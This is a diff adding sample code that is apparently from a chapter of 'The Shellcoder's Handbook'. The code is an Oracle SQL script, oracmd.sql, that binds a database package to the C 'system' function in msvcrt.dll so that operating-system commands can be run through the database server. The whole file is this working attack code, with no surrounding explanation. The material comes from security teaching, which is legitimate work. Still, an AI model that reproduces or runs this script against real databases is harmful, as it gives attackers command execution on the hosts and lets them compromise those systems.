@@ -1,0 +1,40 @@
+/*
+
+The Shellcoder's Handbook: Discovering and Exploiting Security Holes
+Jack Koziol, David Litchfield, Dave Aitel, Chris Anley, 
+Sinan Eren, Neel Mehta, Riley Hassell
+Publisher: John Wiley & Sons
+ISBN: 0764544683
+
+Chapter 17: Instrumented Investigation
+Sample Program #1
+
+Please send comments/feedback to jack@infosecinstitute.com or visit http://www.infosecinstitute.com 
+
+*/
+
+Rem
+Rem oracmd.sql 
+Rem 
+Rem Run system commands via Oracle database servers 
+Rem 
+Rem Bugs to david@ngssoftware.com 
+Rem 
+
+CREATE OR REPLACE LIBRARY exec_shell AS 
+'C:\winnt\system32\msvcrt.dll'; 
+/ 
+show errors 
+CREATE OR REPLACE PACKAGE oracmd IS 
+PROCEDURE exec (cmdstring IN CHAR); 
+end oracmd; 
+/ 
+show errors 
+CREATE OR REPLACE PACKAGE BODY oracmd IS 
+PROCEDURE exec(cmdstring IN CHAR) 
+IS EXTERNAL 
+NAME "system" 
+LIBRARY exec_shell 
+LANGUAGE C; end oracmd;
+/
+show errors
